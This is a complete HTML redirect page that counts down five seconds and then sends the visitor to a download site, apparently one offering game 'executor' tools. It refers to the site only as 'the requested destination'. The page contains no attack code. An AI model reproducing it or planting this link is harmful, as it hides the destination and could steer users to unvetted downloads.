
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Redirecting...</title>

<meta http-equiv="refresh" content="5;url=https://executors.download/llimneyrq3jf/">

<style>
* {
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}

body {
    min-height: 100vh;
    background: #080c10;
    color: #e6edf3;
    font-family: Arial, sans-serif;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 20px;
}

.card {
    width: 100%;
    max-width: 480px;
    background: #0d1117;
    border: 1px solid #21262d;
    border-radius: 16px;
    padding: 40px 30px;
    text-align: center;
    box-shadow: 0 24px 64px rgba(0,0,0,.5);
}

.icon {
    font-size: 48px;
    margin-bottom: 20px;
}

h1 {
    font-size: 23px;
    margin-bottom: 12px;
}

p {
    font-size: 14px;
    color: #8b949e;
    line-height: 1.6;
}

.countdown {
    color: #3fb950;
    font-size: 42px;
    font-weight: bold;
    margin: 25px 0;
}

.track {
    height: 9px;
    background: #21262d;
    border-radius: 20px;
    overflow: hidden;
    margin-bottom: 25px;
}

.fill {
    height: 100%;
    width: 0%;
    background: linear-gradient(90deg,#238636,#3fb950);
    transition: width .1s linear;
}

.button {
    display: block;
    width: 100%;
    padding: 15px;
    background: linear-gradient(180deg,#2ea043,#238636);
    color: white;
    font-weight: bold;
    text-decoration: none;
    border-radius: 8px;
    transition: .2s;
}

.button:hover {
    filter: brightness(1.15);
}

.footer {
    margin-top: 20px;
    font-size: 11px;
    color: #484f58;
}

</style>
</head>

<body>

<div class="card">

    <div class="icon">↗</div>

    <h1>Redirecting you...</h1>

    <p>
        You are being redirected to the requested destination.
        Please wait a moment.
    </p>

    <div class="countdown" id="countdown">5</div>

    <div class="track">
        <div class="fill" id="fill"></div>
    </div>

    <a
        class="button"
        href="https://executors.download/llimneyrq3jf/"
        rel="noopener noreferrer"
    >
        Continue Now →
    </a>

    <div class="footer">
        If automatic redirection doesn't work,
        click the button above.
    </div>

</div>

<script>
const TARGET_URL = "https://executors.download/llimneyrq3jf/";

let remaining = 5;

const countdown = document.getElementById("countdown");
const fill = document.getElementById("fill");

const timer = setInterval(function() {

    remaining--;

    countdown.textContent = remaining;
    fill.style.width = ((5 - remaining) / 5 * 100) + "%";

    if (remaining <= 0) {
        clearInterval(timer);
        window.location.replace(TARGET_URL);
    }

}, 1000);

</script>

</body>
</html>
